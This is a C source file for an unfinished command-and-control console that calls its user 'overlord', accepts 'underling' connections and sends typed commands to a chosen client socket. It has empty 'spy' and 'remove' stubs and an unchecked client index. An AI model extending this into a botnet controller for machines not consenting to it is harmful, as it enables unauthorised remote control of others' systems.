#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <readline/readline.h>
#include <readline/history.h>

#include "network.h"
#include "overlist.h"

#define MAX_INPUT 1024

#define EXIT 0
#define DEFAULT 1
#define ORDER 2
#define SPY 3
#define MANAGE 4

int min(int a, int b) {
  if (a > b) {
    return b;
  }

  return a;
}

void prompt(char **input_ptr, char *prefix, int history) {
  if (*input_ptr) {
    free(*input_ptr);
  }

  *input_ptr = readline(prefix);

  if (history && *input_ptr && **input_ptr) {
    add_history(*input_ptr);
  }
}

int startsWith(char *s1, char *s2) {
  return strncmp(s1, s2, strlen(s2)) == 0;
}

int main() {
  printf("Welcome, overlord.\n");
  printf("Type help for available commands.\n");

  int state = DEFAULT;
  char *input = NULL;
  client_list *underlings = newClientList();
  int sock = serverSocket(PORT);

	while (state) {
    switch (state) {
    case DEFAULT:
      prompt(&input, "[DEFAULT]> ", 1);

      if (startsWith(input, "help")) {
      
      } else if (startsWith(input, "order")) {
        state = ORDER;
      } else if (startsWith(input, "spy")) {
        state = SPY;
      } else if (startsWith(input, "manage")) {
        state = MANAGE;
      } else if (startsWith(input, "exit")) {
        state = EXIT;
      }

      break;

    case ORDER:
      printClientList(underlings);

      prompt(&input, "Enter underling ID: ", 0);

      client_node *underling = underlings->list[atoi(input)];

      prompt(&input, "Enter command: ", 0);

      write(underling->sock, input, min(strlen(input) + 1, MAX_MESSAGE_LENGTH));

      state = DEFAULT;
      
      break;

    case SPY:

      break;

    case MANAGE:
      prompt(&input, "[MANAGE]> ", 1);

      if (startsWith(input, "add")) {
        printf("Waiting for underling to connect...\n");

        int connection = serverConnect(sock);

        printf("Underling connected.\n");

        prompt(&input, "Enter a description for this underling: ", 0);

        addClientToList(underlings, 0, connection, input);
      } else if (startsWith(input, "remove")) {

      } else if (startsWith(input, "view")) {
        printClientList(underlings);
      } else if (startsWith(input, "back")) {
        state = DEFAULT;
      }
            
      break;

    default:

      break;
    }
	}

  free(input);
  freeClientList(underlings);
  close(sock);
  
	return 0;
}
